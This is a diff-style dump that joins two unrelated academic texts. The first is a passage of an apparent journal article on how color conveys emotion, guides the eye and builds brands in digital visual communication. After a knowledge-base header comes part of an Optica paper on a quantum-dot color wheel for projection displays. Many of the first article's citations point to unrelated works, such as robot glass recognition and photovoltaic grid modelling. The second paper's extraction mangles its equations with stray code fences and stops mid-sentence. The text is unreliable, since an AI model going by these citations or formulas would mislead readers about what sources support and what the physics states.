+emotional responses and convey different information and emotions. The following is a detailed analysis of the emotional effects 
+
+of several common colors in visual communication [22] .
+
+(1) Red is a vibrant and passionate color with strong visual impact [23] . In visual communication, red is often used to express 
+
+passion, love, courage, strength and other emotions. For example, in advertisements, the color red is often used to highlight the 
+
+passion and vitality of a product or service to attract consumers' attention. At the same time, red can also inspire people's fighting 
+
+spirit and determination, so in some sports or athletic occasions, red is also often used as the theme color [24] . However, it is 
+
+worth noting that in some specific aspects, the color red can also form a certain negative impact, producing some negative 
+
+emotional effects, such as tension, anger or a sense of danger. Therefore, the use of red color in visual communication should be 
+
+carefully selected according to the specific context and characteristics of the target audience [25] .
+
+(2) Blue is a calm, rational and trusting color. In visual communication, blue is often used to express professional, reliable 
+
+and stable emotions. For example, in finance, science and technology, blue is often used as the main color to convey a
+
+professional, rigorous brand image. Blue can also create a quiet, calm atmosphere, help relieve tension, enhance people's sense of 
+
+trust. At the same time. Different levels of blue may sometimes give people a different feeling, such as light blue bright, dark blue 
+
+melancholy, ink indifferent. So in the use of blue, need to pay attention to grasp the brightness of the color and saturation, in 
+
+order to avoid negative emotional effects. 
+
+(3) Yellow is a bright, warm and happy color. In visual communication, yellow is often used to express energy, sunshine, 
+
+warmth and other emotions. In the advertisements of children's products or household products, yellow is often used as the main 
+
+color to create a cheerful and relaxing atmosphere. At the same time, yellow also has a high degree of recognition, can quickly 
+
+attract people's attention. But the transition of the yellow color can also form a harsh or too noisy effect. Therefore, when used, 
+
+according to the design needs and the characteristics of the target audience to make moderate adjustments. 
+
+(4) Green represents the color of nature, health and peace. In visual communication, green is often used to express 
+
+environmental protection, health, safety and other emotions. In the publicity of environmental protection products, green is often 
+
+used as the main color to emphasize the environmental characteristics of the product. This color can also create a fresh, natural 
+
+atmosphere, which helps to enhance people's sense of comfort and relaxation. 
+
+In visual communication, designers need to select the appropriate color according to the design needs and the characteristics 
+
+of the target audience to match and use, in order to convey specific information and emotions, in-depth understanding of the 
+
+characteristics of various colors and emotional effects, and combined with the specific design needs and the characteristics of the 
+
+target audience for flexible use. 
+
+3 ANALYSIS OF THE ROLE OF COLOR IN VISUAL COMMUNICATION IN THE DIGITAL PERSPECTIVE, 
+
+3.1 Emotional communication 
+
+The multi-dimensional integration of color makes visual communication more rich and diversified. As one of the core 
+
+elements of visual communication, in terms of emotional communication, color, with its unique charm and power, brings the 
+
+audience a profound emotional experience. Firstly, digital technology makes the use of color in visual communication more 
+
+accurate and flexible. See Figure 1 for details. Lyu H. / MAA , 25(1), 352-357           
+
+> Mediterranean Archaeology and Archaeometry, Vol. 25,No 1,(202 5), pp. 352 -357
+
+354 
+
+Fig. 1 Illustration of the content of color-emotion communication in visual communication 
+
+Figure 1 is mainly about the setting and analysis of the content of color emotion communication in visual communication. 
+
+Based on this, through digital tools, designers can accurately adjust the brightness, saturation and hue of colors to create a rich 
+
+variety of color effects. This precision makes the color can be better combined with the visual content to form a more harmonious 
+
+visual experience, which further deepens the depth and breadth of emotional communication. Secondly, color has a direct 
+
+emotional mapping effect in digital visual communication. Each color has unique emotional symbols and cultural connotations, 
+
+which can trigger the audience's specific emotional response. For example, red often symbolizes passion, vitality and courage, 
+
+which can stimulate the audience's enthusiasm and positive emotions; blue represents calmness, rationality and trust, which can 
+
+create a stable and professional atmosphere. In digital visual communication, designers can choose the right color to convey a
+
+specific emotional message, triggering the audience's empathy and recognition. 
+
+In addition, the color and emotion communication in the digital field of vision also has a stronger interactivity and 
+
+personalization. According to the audience's behavior and feedback, the use of color and collocation can be adjusted in real time, 
+
+which makes the visual communication works more in line with the audience's preferences and needs. Stronger interactivity not 
+
+only enhances the audience's sense of participation and immersion in the work, but also makes the emotional communication 
+
+more accurate and effective. In addition, the personalized use of color can also better highlight the uniqueness and creativity of 
+
+the work, which further enhances the effect of emotional communication. Under the digital perspective, the emotional 
+
+communication of color is also reflected in cross-cultural and cross-disciplinary communication. By skillfully using colors in a
+
+diversified way, designers break through cultural and linguistic barriers in practice, and effectively convey emotions and 
+
+messages to audiences of different backgrounds. However, in Gu cheng, due to the diversity and complexity of digital technology, 
+
+it is necessary to constantly learn and master new techniques and tools for using color. Coupled with the changing and upgrading 
+
+of the audience's aesthetic needs, it is necessary to constantly innovate and try new ways of color matching and combination to 
+
+better meet the audience's emotional needs. 
+
+3.2 Visual guidance 
+
+Color in digital visual communication can build visual hierarchy through changes in brightness and saturation. In digital 
+
+design, the difference in brightness and saturation of different colors can be used to create a sharp contrast effect. This contrast 
+
+not only makes the boundaries between information blocks clear, but also guides the viewer's eyes to flow according to the 
+
+designer's intention. Specific forms of guidance in the figure illustrates. 
+
+Fig. 2 Diagrammatic representation of color in guiding forms in visual communication 
+
+Figure 2 is mainly an analysis of the design and practice of color guidance in visual communication. For example, in web 
+
+design, by adjusting the brightness and saturation of different information blocks, important information can be made more 
+
+prominent and attract users' attention; colors can also guide the audience's sight through the contrast of warm and cold colors. In 
+
+digital visual communication, the use of warm and cool colors is crucial for creating an atmosphere and guiding the visual flow. 
+
+Cool colors usually give people a sense of peace and calm, while warm colors can stimulate people's enthusiasm and vitality. 
+
+Through the clever combination of warm and cool colors, a visual flow is created to guide the audience to browse the information 
+
+in a certain direction. This visual guidance not only makes the information conveyed more naturally and smoothly, but also 
+
+enhances the audience's reading experience; the color visual guidance in the digital field of vision is also reflected in the sense of 
+
+rhythm and rhyme of color. Designers create visual effects with rhythm and rhyme through gradation, repetition and contrast of 
+
+colors. The visual effect can not only attract the audience's attention, but also guide them to receive information in a certain 
+
+rhythm and order. For example, in animation design, through the gradation and transformation of colors, it can create a dynamic 
+
+visual effect and guide the audience to follow the rhythm and change of the animation. 
+
+In fact, the integration and guidance of digital technology, to a certain extent, provides more possibilities for the visual 
+
+guidance of color in visual communication. With the aid and support of digital tools and technologies, designers can precisely 
+
+control the change and application of color to achieve more complex and detailed visual guidance effects. For example: the use of Lyu H. / MAA , 25(1), 352-357           
+
+> Mediterranean Archaeology and Archaeometry, Vol. 25,No 1,(202 5), pp. 352 -357
+
+355 
+
+digital software in the color adjustment tools, designers can make precise modifications and adjustments to the color in the image, 
+
+so that the use of color is more in line with the needs and goals of the design. At that time, this also requires designers to have a
+
+solid foundation in color theory and rich practical experience, according to the design needs and the characteristics of the target 
+
+audience for flexible use. At the same time, designers also need to constantly learn and explore new ways of using color and 
+
+techniques to adapt to the ever-changing digital environment and audience needs. 
+
+3.3 Associative functions 
+
+Color in digital visual communication can trigger the audience's association with specific things. Each color has a unique 
+
+symbolic meaning and cultural connotation, and can be associated with specific things or scenes. For example, when people see 
+
+green, they tend to associate it with nature, vitality and peace; when they see blue, they tend to associate it with ocean, sky and 
+
+calmness. In digital visual communication, the use of these colors symbolism, and specific things or scenes combined to trigger 
+
+the audience's associations, thereby enhancing the communication effect of the information; color can also trigger the audience's 
+
+emotions and emotional associations. Different colors can evoke different emotional responses, but also guide the audience to 
+
+form different face thinking. For example, red is like fire, blue is like water, and green is like vitality. In digital visual 
+
+communication, designers use the emotional characteristics of color to create a specific emotional atmosphere, triggering the 
+
+audience's empathy and feelings. This emotional association not only enhances the communication effect of information, but also 
+
+makes the visual communication works more infectious and attractive. 
+
+In addition, the association function of color in digital visual communication is also reflected in the association of culture and 
+
+history. As a kind of cultural symbol, it carries rich historical and cultural connotations, and through the use of colors with 
+
+specific cultural significance, it triggers the audience's association with culture and history, and conveys specific cultural 
+
+information and values. The current setting corresponds to the content of the association guide, see table 1 to illustrate. 
+
+Table 1 Table of associative content settings of color in digital visual communication 
+
+Color associates content names in digital visual 
+
+communication Content standards 
+
+Color block splicing Adjustment of different color blocks 
+
+Visual overlap Color causes visual overlap 
+
+Digital adjustment Combining digital technology for unbalanced 
+
+adjustment 
+
+Dynamic presentation Visualization+Dynamization 
+
+Figure 1 is mainly about the setting of the association content of color in digital visual communication. The current 
+
+association standard and content are not fixed, but can be adjusted according to the actual needs. This kind of cultural association 
+
+not only enriches the content of visual communication, but also enhances the cultural connotation and depth of the work. 
+
+Coupled with digital tools and technologies, designers can control the use and presentation of color more precisely, making the 
+
+color association effect more prominent and strong. In addition, digital technology can also realize dynamic changes and 
+
+interactive effects of color, further enriching the associative level and connotation of color. In this context, designers also put 
+
+forward higher requirements, need to be more familiar with the characteristics and symbolism of various colors, familiar with 
+
+color and things, emotions, culture and other aspects of the connection. Flexible use of color, to create a unique association effect 
+
+of visual communication works. 
+
+3.4 Culture, brand building 
+
+As an important carrier of culture, different colors often have specific symbolic meaning and cultural connotation in different 
+
+cultural backgrounds. In visual communication, designers choose specific colors to convey specific cultural information and 
+
+values. For example, in Chinese culture, red represents festivity, auspiciousness and prosperity, so in the visual communication of 
+
+Chinese brands, red is often used as the main color to express the festive atmosphere and cultural heritage of the brand. In 
+
+western culture, blue is often regarded as a symbol of stability, professionalism and trustworthiness, so in the visual 
+
+communication of international brands, blue is often used to convey the professionalism and reliability of the brand; color plays a
+
+crucial role in branding. The shaping of brand image needs to rely on the power of visual communication, and color, as an 
+
+important element of visual communication, can directly affect people's perception and feeling of the brand. By choosing the right 
+
+color, we can create a unique brand image and make the brand stand out in the fierce market competition. For example, 
+
+Coca-Cola's red and white combination has become its brand's signature color, which not only allows people to recognize 
+
+Coca-Cola at a glance, but also conveys the brand's vitality and enthusiasm. Similarly, Apple's silver and white combination also 
+
+represents the brand's simplicity, fashion and high-end; digital technology provides more possibilities for the cultural expression 
+
+and branding of color in visual communication, realizing the dynamic changes and interactive effects of color, making the role of 
+
+color in branding more prominent and vivid. For example, some brands will use digital means, in different scenes and activities, 
+
+through color changes to convey different information and emotions of the brand, to enhance the interactivity and experience of 
+
+the brand. In the whole process, the color, visual communication and brand will establish more links, the characteristics of its 
+
+settings and the needs of the target audience, but also to create a brand culture in line with the visual image that can attract 
+
+consumers, prompting the role of cultural expression and branding will be more in-depth excavation and application. 
+
+CONCLUSION 
+
+In conclusion, the above is an in-depth discussion and practical research on the role of color in visual communication under 
+
+the digital perspective. Color plays a pivotal role in digital visual communication, not only as a visual element, but also as a carrier Lyu H. / MAA , 25(1), 352-357           
+
+> Mediterranean Archaeology and Archaeometry, Vol. 25,No 1,(202 5), pp. 352 -357
+
+356 
+
+of emotion and a medium of information, which can effectively convey the designer's intention and the audience's needs. Driven 
+
+by digital technology, the use of color has become more flexible and diverse, bringing unprecedented possibilities for visual 
+
+communication. But at the same time, facing the complex background of references, it is necessary to establish corresponding 
+
+links for color management and color innovation, strengthen the speed and efficiency of color differentiation, and stimulate the 
+
+enthusiasm of learners to explore and innovate continuously. Together, we will explore the new applications, trends and methods 
+
+of color in digital visual communication, and contribute more wisdom and strength to the development of visual communication. 
+
+.Lyu H. / MAA , 25(1), 352-357           
+
+> Mediterranean Archaeology and Archaeometry, Vol. 25,No 1,(202 5), pp. 352 -357
+
+357 
+
+REFERENCES 
+
+[1] Macdonald I .Window on the weather: a case study in multi-platform visual communication design, with a relationship to 
+
+Design Thinking:[J].Visual Communication, 2023, 22(2):365-386. 
+
+[2] Z Zhang,R Wang.The Research Origin, Academic Approach and Knowledge Pedigree of Visual Communication in China 
+
+(1986-2022)[J].Chinese Journal of Journalism & Communication, 2023, 45(1):84-105. 
+
+[3] Yang Z , Wen C , Luo H Z T .ACSiam: Asymmetric convolution structures for visual tracking with Siamese 
+
+network[J].Journal of visual communication & image representation, 2022, 84(4):1.1-1.10. 
+
+[4] Hasko J , Rivera M C , Erbacher M K ,et al.Visual Analysis Plus Hierarchical Linear Model Regressions: Morphosyntax 
+
+Intervention with Deaf-and-Hard-of-Hearing Students:[J].Communication Disorders Quarterly, 2022, 43(3):195-205. 
+
+[5] Rita Brdar-Szab ó, Brdar M .Cultural models mediating between visual sensation and semiotic systems, exemplified on 
+
+visual, alpha-pictorial and verbal-gestural communication:[J].Cognitive Linguistic Studies, 2023, 10(2):367-397. 
+
+[6] Wei M , Sun Y , Li S ,et al.Single-cell profiling reveals Müller glia coordinate retinal intercellular communication during 
+
+light/dark adaptation via thyroid hormone signaling[J]. Proteins and Cells, 2023, 14(8):603-617. 
+
+[7] Sawadwuthikul G , Tothong T , Lodkaew T ,et al.Visual Goal Human-Robot Communication Framework with Few-Shot 
+
+Learning: a Case Study in Robot Waiter System[J].IEEE Transactions on Industrial Informatics, 2022, 18(3):1883-1891. 
+
+[8] Li S , Li J .Design of Medical Graphic Aided Visual Elements Active Communication Algorithm in Print 
+
+Advertising[J].Journal of Testing and Evaluation: A Multidisciplinary Forum for Applied Sciences and Engineering, 2023, 
+
+51(1):97-106. 
+
+[9] Hashemi H , Shahidi A , Hashemi A ,et al.The prevalence of red-green color vision deficiency and its related factors in an 
+
+elderly population above 60 years of age[J]. International Journal of Ophthalmology, 2023, 16(9):1535-1541. 
+
+[10] Gao J G , Tian M .Prevalence of color vision deficiency among Chinese college students and their quality of life[J]. 
+
+International Journal of Ophthalmology, 2023, 16(9):1542-1548. 
+
+[11] Tompkins N , Gunther K L .Color Vision Deficiency and Teaching Electromagnetism[J].The Physics Teacher, 2022, 
+
+60(6):466-468. 
+
+[12] Chen C , Lie Z , Fu L .Perovskite photodetector-based single pixel color camera for artificial vision[J]. Light: Science and 
+
+Applications, 2023, 12(4):509-511. 
+
+[13] Ohkoba M , Ishikawa T , Hira S ,et al.Color representations of normals and congenital red –green color deficiencies: 
+
+Estimation of individual results based on color vision model[J].Color Research And Application, 2022, 47(3):565-584. 
+
+[14] Zhi-Jun W , Shuai-Rui G .Study on Futon Patterns in Mural of Buddhist Temple in Wutai Mountain under Digital 
+
+Vision[J]. Literature and Art Research, 2023, 13(3):199-209. 
+
+[15] Freeth P J .Peripheral vision and challenging invisibilities:Theoretical and methodological reflections on the "digitized 
+
+turn" and "born-digital" sources in archives of translation and translators[J].Translation in Society, 2023, 2(2):213-234. 
+
+[16] Bernacki J , Scherer R .Remarks on Speeding up the Digital Camera Identification using Convolutional Neural 
+
+Networks[J].Vietnam Journal of Computer Science, 2023, 10(04):537-555. 
+
+[17] Groshev M , Baldoni G , Cominardi L ,et al.Edge robotics:are we ready?an experimental evaluation of current vision and 
+
+future directions[J]. Digital Communication and Networks, 2023, 9(1):166-174. 
+
+[18] Miaozi T , Wuyun L U .Myth and Digital Fantasy from the Perspective of Technical Aesthetics[J]. Landscape research, 
+
+2023, 15(2):85-88. 
+
+[19] Lin J , Sun G , Shen J ,et al.From computer vision to short text understanding: Applying similar approaches into different 
+
+disciplines[J].Intelligent and Converged Networks, 2022, 3(2):161-172. 
+
+[20] Chen T , Wu Z , Hu L ,et al.The visual naturalness effect: Impact of natural logos on brand personality 
+
+perception[J].International Journal of Consumer Studies, 2023, 47(4):1351-1363. 
+
+[21] Kumar D , Joharji L , Li H ,et al.Artificial visual perception neural system using a solution-processable MoS_(2)-based 
+
+in-memory light sensor[J]. Light: Science and Applications, 2023, 12(8):1583-1594. 
+
+[22] Zhang S , Shan J , Sun F ,et al.Multimode fusion perception for transparent glass recognition[J].Industrial Robot: the 
+
+international journal of robotics research and application, 2022, 49(4):625-633. 
+
+[23] Lee J , Park S .Current design guidelines ’ streetscape improvement for visual perception and walkability: A case study of 
+
+Sejong City, Republic of Korea[J]. Frontiers of Architecture Research, 2023, 12(3):423-443. 
+
+[24] Guan Z , Lin M , Wu Q ,et al.Neural mechanisms of top-down divided and selective spatial attention in visual and 
+
+auditory perception[J]. Neuroscience, 2023, 9(2):95-113. 
+
+[25] J Liu,Y GuoDigital modeling and simulation of distributed photovoltaic power generation grid connection[J].Computer 
+
+Simulation, 2022, 39(9):96-100.
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, vcs, api]
+
+### 📘 KNOWLEDGE: NEXUS_OPTICA-10-11-1559.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+##### Research Article Vol. 10, No. 11 / November 2023 / Optica 1559
+Quantum-dot color wheel for projection displays
+Yinguo Yan,1 Yuze Xiao,1 Junhu Cai,1 Yushuo Zhang,1 Yun Ye,1,2 Sheng Xu,1,2 Qun Yan,1,2
+Tailiang Guo,1,2 AND Enguo Chen1,2,*
+1 National and Local United Engineering Laboratory of Flat Panel Display Technology, College of Physics and Information Engineering,
+Fuzhou University, Fuzhou 350108, China2
+Fujian Science & Technology Innovation Laboratory for Optoelectronic Information of China, Fuzhou 350108, China
+*ceg@fzu.edu.cn
+```
+Received 11 August 2023; revised 23 October 2023; accepted 23 October 2023; published 15 November 2023
+```
+```
+A color wheel (CW) is one of the most essential devices for contemporary projection displays because it provides the
+```
+color initialization definition and determines the color performance of the whole system. However, conventional color
+wheels remain limited in terms of color performance and efficiency because of the light-absorbing material and time
+sequential color generation. Quantum dots, found in 1981 and known as a kind of quasi-zero-dimensional nanoma-
+terial, exhibit excellent features for displays due to their quantum confinement effect, which won the 2023 Nobel Prize
+```
+in Chemistry. Inspired by this, the paper systematically demonstrates a quantum-dot color wheel (QD-CW) device
+```
+through theoretical derivation, simulation analysis, and experimental verification. The theoretical model to define the
+duty circle ratio is presented for the QD-CW and verified by Monte Carlo ray-tracing simulation. In terms of experimen-
+tal verification, the QD-CW device is realized by multiple rounds of a photolithography process, and then assembled
+into a blue laser pumped projection prototype for full-color display. The chromaticity coordinates of white-balanced
+```
+output are finally located at (0.317,0.338), which matches well with a standard D65 source. The color gamut area of the
+```
+```
+QD-CW device reaches 116.6% NTSC, and the average light conversion efficiency (LCE) of the prepared QD-CW is
+```
+57.0%. The proposed QD-CW device has ∼40% higher color gamut area and 1.2× higher LCE than a conventional CW
+device. These exciting findings show a groundbreaking approach to color generation in projection displays, which are
+expected to shed light on other high-quality display applications. © 2023 Optica Publishing Group under the terms of the
+Optica Open Access Publishing Agreement
+```
+https://doi.org/10.1364/OPTICA.502938
+```
+1. INTRODUCTION
+The optical engines of current mainstream projectors are com-
+monly composed of a light source, an illumination system, a single
+micro display chip, and an imaging system. The light source can
+be a metal mercury lamp or a white LED to produce white light.
+```
+A color wheel (CW), consisting of multiple light-absorbing color
+```
+channels, is used to decompose the incident white light into multi-
+ple primary colors within the time sequential domain and provide
+the color initialization definition for projection displays [1–5]. The
+conventional color wheel is inefficient with the light-absorbing
+```
+color filter (CF). The light with the required spectral waveband will
+```
+pass through the CF while the other light is blocked and absorbed,
+thus enabling the separation and filtering of the incident white
+light. The color gamut and color purity of the projection display
+are limited by both the broad spectral distribution of the incident
+white light and the wide bandwidth of the transmission spectrum
+of the CW. The other color generation strategy is to use a blue exci-
+tation source combined with a phosphor-based CW. For example,
+Hu and Li developed a portable projector based on a blue laser
+and phosphorescent wheel, which improved the color gamut by
+30% with Rec. 709 standards when operating at full power [6].
+However, an additional filter is required to filter out unwanted
+light due to the broad emission spectrum of the phosphor, which
+limits the efficiency and the color gamut.
+```
+As a rising star, quantum-dot (QD) material enables efficient
+```
+fluorescent conversion with a wider color gamut for emerging
+display devices [7–16], which have exhibited their superiority
+```
+in QD photoluminescent organic light-emitting diodes (QD-
+```
+```
+OLEDs) [17–19], QD electroluminescent light-emitting diodes
+```
+```
+(QLEDs) [20–22], and micro-LEDs [23–27]. For example, in
+```
+2016, a patterned QD film was first prepared by Kim et al. for
+the color conversion of an OLED backlight [28]. In 2020, Yin
+et al. developed a high-efficiency full-color micro-LED display
+by combining a QD film [29]. In 2015, Han et al. used aerosol jet
+technology to combine red, green, and blue colloidal QDs with
+micro-LED arrays to realize independent addressing of full-color
+micro-LED arrays [30]. In 2020, Chen et al. realized a high-color-
+gamut micro-LED display combined with QD photoresist by
+photolithographic preparation [31]. This kind of QD converted
+micro-LED display can also be realized by inkjet printing tech-
+nology [32]. The aforementioned researches demonstrate that
+introducing the superiority of QDs brings certain interesting find-
+ings for emerging display devices. Inspired by this, a performance
+revolution of traditional CW devices is just around the corner, but
+it has not been explicitly explored before.
+2334-2536/23/111559-08 Journal © 2023 Optica Publishing Group
+Research Article Vol. 10, No. 11 / November 2023 / Optica 1560
+For the first time, to the best of our knowledge, this paper
+presents a QD-color-converted CW device by using three-
+```
+primary-color QD color conversion layers (QDCCL) instead
+```
+of an absorptive metal coating, which brings superior optical and
+color performance compared to conventional projection displays.
+The detailed theoretical derivation is disclosed and verified via both
+simulation and experiment. The fundamental theory for the white
+```
+balance of the QD-CW device is first presented; then, the Monte
+```
+Carlo ray-tracing simulation is used to explore the light output
+characteristics of the QD-CW device. Finally, a blue laser pumped
+laser projector prototype equipped with the proposed QD-CW
+device is experimentally assembled and discussed.
+2. THEORETICAL MODEL
+In a traditional CW device, the absorptive metal coating layers
+usually include three primary color channels or specific additional
+channels, such as white channels to increase the brightness, and
+yellow and cyan channels to widen the color gamut. As for the
+QD-CW device, the backlight should be replaced by a blue exci-
+tation source. Considering the three primary color QD channels,
+the definition of the duty cycle is critical for the output white light
+within the spatial domain.
+White balance is a key display indicator that describes the
+accuracy of the white color generated by mixing the three primary
+```
+colors. It can be achieved when the intensity of the red (R), green
+```
+```
+(G), and blue (B) light matches each other [33–37]. In a stand-
+```
+ard room, the D65 light source with chromaticity coordinates of
+```
+(0.313,0.329) is usually defined as the white balance [38–41].
+```
+The white balance can be achieved by adjusting the transmis-
+sion area of the three primary color channels on the QD-CW
+device. The principle of white balance adjustment for a QD-CW
+device can be expressed by
+```
+SR ηR : SG ηG : SB ηB = PR : PG : PB , (1)
+```
+```
+where PR , PG , and PB are the luminous power; SR , SG , and
+```
+```
+SB are the areas; and ηR , ηG , and ηB are the light conversion
+```
+```
+efficiencies (LCE) of the RGB color channels, respectively. The
+```
+blue channel is kept blank to allow the blue backlight to pass
+through so that ηB can be ideally considered as 100%. Based on
+```
+Eq. (1), the white-balanced area ratio of RGB color channels can be
+```
+determined by
+```
+SR : SG : SB = PRη
+```
+R
+: PGη
+G
+: PBη
+B
+```
+, (2)
+```
+where the area of the RGB color channel can be further expanded
+```
+as S = 1/2(θr 2) for a fan-shaped CW. θR , θG , and θB are defined
+```
+as the circular angles of the RGB color channels on the QD-CW,
+respectively. Finally, the ratio of the circular angles of the RGB
+color block, also known as the duty cycle, can be expressed by
+θR : θG : θB = 2PRη
+R r 2
+: 2PGη
+G r 2
+: 2PBη
+B r 2
+```
+. (3)
+```
+3. PARAMETERIZATION
+A. Quantum-Dot Characterization
+The approach to design a QD-CW device is described, and the key
+parameters come from both the experimental characterization of
+the QD material and the duty cycle simulation for white balance.
+```
+The visible absorption spectra (Abs) and photoluminescence
+```
+```
+(PL) spectra of red and green core-shell CdSe@ZnS QDs in a
+```
+```
+toluene solution are measured and shown in Figs. 1(a) and 1(b),
+```
+respectively. The red and green peak wavelengths are 626 nm and
+```
+530 nm, and the full width at half maximum (FWHM) is 26 nm
+```
+```
+and 21 nm, respectively. The quantum yields (QY) of red and
+```
+green QD are above 80%, in which the QY of green QD reaches
+97%. The PLQY of CdSe QDs is enhanced after ZnS shell coating
+because the coating layer can eliminate many nonradiative com-
+posite centers on the QD’s surface. The existence of the shell will
+also provide a stable and reliable working environment for water
+and oxygen resistance [42–45].
+```
+X-ray diffraction spectra (XRD) of red and green QDs are
+```
+```
+shown in Figs. 1(c) and 1(d), respectively. Compared to the stand-
+```
+ard PDF spectra of CdSe and ZnS, the spectral diffraction peaks
+of red and green QDs are in between the CdSe and ZnS spectral
+diffraction peaks, which confirms the core shell CdSe@ZnS struc-
+ture. The interaction between the nanoparticles and the solvent,
+```
+Fig. 1. Quantum-dot characterization for the design of a three primary color QD-CW device. Abs and PL spectra of: (a) red and (b) green QDs. XRD
+```
+```
+of: (c) red and (d) green QDs. TEM images of: (e) red and (f ) green QDs, where the inserted graphs are the average particle size distribution of red and green
+```
+QDs.
+Research Article Vol. 10, No. 11 / November 2023 / Optica 1561
+as well as the volatilization of the solvent molecules, would bring
+about the aggregation of the QD particles. The agglomeration
+can seriously affect the LCE and stability of the QD-CW device.
+To evaluate the dispersibility of QD particles in the toluene solu-
+tion, the structural morphology of CdSe@ZnS QDs is further
+```
+characterized by using transmission electron microscopy (TEM).
+```
+```
+Figures 1(e) and 1(f ) both show that the red and green QDs have
+```
+been well dispersed. The average particle sizes of red and green
+CdSe@ZnS QDs are 8.16 ± 0.95 nm and 10.32 ± 0.84 nm,
+respectively.
+B. Duty Cycle for White Balance
+Based on the QD materials above, a ray-tracing simulation is then
+used to determine the duty cycle of the QD-CW device. The initial
+duty cycle of the QD-CW device is set to θR : θG : θB = 1 : 1 : 1.
+```
+Figures 2(a) and 2(b) show the schematic and the corresponding
+```
+emission spectrum, where the blue light intensity is significantly
+larger than red and green. The output CIE chromaticity coordi-
+```
+nate point is (0.225, 0.123), obviously far from the target white
+```
+balance of the standard D65 light source. Keeping the simulation
+parameters unchanged, the duty cycle is scanned for searching
+the target white balance. When θR : θG : θB reaches 3.286: 4.286:
+1, the standard D65 white balance can be finally achieved. This
+```
+result is very close to that calculated in Eq. (3). The detailed deriva-
+```
+tion of the theoretical validation can be found in Supplement 1.
+```
+Figures 2(c) and 2(d) show the schematic diagram of the optimized
+```
+QD-CW device and the corresponding emission spectrum. It
+can be seen that the blue light is significantly reduced, while the
+red and green spectra are enhanced accordingly. The output CIE
+white balance has been achieved with the chromaticity coordinate
+```
+point of (0.313, 0.329), matching perfectly with the standard D65
+```
+source.
+```
+Fig. 2. Schematic of the QD-CW device with: (a) the initial
+```
+```
+duty cycle of θR : θG : θB = 1 : 1 : 1 and (c) the optimized duty
+```
+cycle of θR : θG : θB = 3.286 : 4.286 : 1. Simulated emission spec-
+```
+tra of the QD-CW device with: (b) θR : θG : θB = 1 : 1 : 1 and
+```
+```
+(d) θR: θG: θB = 3.286 : 4.286 : 1.
+```
+4. EXPERIMENTS
+A. Preparation and Characterization
+```
+As shown in Fig. 3(a), a QD-CW device sample with the duty
+```
+cycle above can be divided into four segments, and the QDCCLs
+are fabricated by multiple rounds of a photolithography process.
+The fabrication details are described in Supplement 1. The left
+```
+side of Fig. 3(b) shows the QD-CW under natural light, and the
+```
+right side shows the QD-CW under UV light. It can be seen that
+the red and green segments are bright and uniform on the glass
+```
+substrate. Figures 3(c) and 3(d) show the 2D and 3D morphology
+```
+of the surface roughness of the red and green QDCCL measured
+```
+by atomic force microscopy (AFM, Bruker, multimode 8). The
+```
+```
+root mean square height (Sq) and arithmetic means the height (Sa)
+```
+of the red QDCCLs are, respectively, measured to be 0.329 nm
+and 0.257 nm, while those of the green QDCCLs are 0.436 nm
+and 0.337 nm, respectively. This surface roughness proves that the
+surface of the red and green QDCCLs is smooth and flat [46–48].
+B. Color Performance
+A mini-LED backlight is used here to evaluate the color perform-
+ance of the fabricated QD-CW device sample. The normalized
+```
+spectrum of the mini-LED backlight is indicated by A0 in Fig. 4(a).
+```
+After passing through the green segment the QD-CW sample, the
+spectrum is split into two independent parts: A1G and A2G. The
+red light conversion has similar two output parts. Obviously, A2G
+is the intensity of the converted green light, and A1G represents
+the intensity of the remaining blue light without color conversion
+and directly passing through the green QDCCL. This will reduce
+```
+the color purity; therefore, a long-pass distributed Bragg reflector
+```
+```
+(DBR) is placed on top of the QDCCL to reduce the blue light
+```
+transmission. The DBR is made by stacking the multiple periodic
+```
+films with high and low refractive indices; the thickness of each
+```
+film is 1/4 of the wavelength of its central reflection [49–51]. The
+strong wavelength selective transmittance of the DBR can help
+to reflect the blue light and let the converted light pass through
+```
+[52,53]. As shown in Fig. 4(b), the transmission spectrum of this
+```
+DBR has a dramatic change at the wavelength of 500 nm. The
+transmittance approaches 0 for the wavelength lower than 500 nm
+and up to 95.5% for the wavelength higher than 500 nm. It means
+the DBR can provide high reflectivity for blue light and high trans-
+mission for converted light from the QDCCL. The parameters
+of the DBR are also used in the simulation to determine the duty
+cycle.
+```
+In Fig. 4(c), the green curve shows the emission spectrum of the
+```
+green QDCCL by using the DBR. The blue waveband has been
+eliminated well, with the green intensity growing by 2%. The blue
+```
+light absorption (BLA) and light conversion efficiency (LCE, η) are
+```
+defined, respectively, by
+```
+BLA = Iin − ItbI
+```
+in
+```
+= A0 − A1A0 , (4)
+```
+η = IocI
+in
+```
+= A2A0 , (5)
+```
+where Itb, Ioc, and Iin are the intensity of the transmitted blue light,
+the converted light, and the total incident light, respectively. A0
+indicates the total number of blue photons obtained by integrating
+```
+over the wavelength range of blue light, as shown in Figs. 4(a) and
+```
+```
+4(c). A1 indicates the number of blue photons that remain after
+```
+Research Article Vol. 10, No. 11 / November 2023 / Optica 1562
+```
+Fig. 3. Experimental results of the QD-CW device sample. (a) Four segments of the fabricated QD-CW device sample. (b) Sample under the natural
+```
+```
+light and UV light. AFM images of: (c) the red and (d) green QDCCLs on the QD-CW device sample.
+```
+```
+Fig. 4. Color performance of the QD-CW device sample. Emission spectrum and the performance of the red and green QDCCLs (a) without the DBR
+```
+```
+and (c) with the DBR. (b) Transmission spectrum of the DBR. (d) Working mechanism of the DBR.
+```
+passing through the QDCCL, obtained by integrating over the
+wavelength range of the blue light passing through the QDCCL.
+A2 indicates the number of photons converted after passing
+through the QDCCL, obtained by integrating over the wavelength
+range corresponding to the red or green light. The expression of
+A0, A1, and A2 can be calculated by
+
+
+
+```
+A0 =
+```
+∫ λ1
+```
+λ2 ϕB (λ)dλ
+```
+```
+A1 =
+```
+∫ λ1
+```
+λ2 ϕB (λ)dλ
+```
+```
+A2i =
+```
+∫ λ1
+```
+λ2 ϕi (λ)dλ, ( i = R, G)
+```
+```
+. (6)
+```
+By combining the equations above, the overall LCE of the QD-
+CW device, ηoverall, is given by
+```
+ηoverall = ηB θB + ηR θR + ηG θG360◦ . (7)
+```
+After calculation, the BLA of the green QDCCL is increased
+from 88.3% to 99.6%, and the LCE is increased from 28.3% to
+31.6%. The color purity is also improved, with the chromaticity
+```
+coordinates changing from (0.172, 0.451) to (0.187, 0.745).
+```
+A similar performance improvement is clearly found for the red
+QDCCL, in which the BLA and LCE of the red QDCCL increased
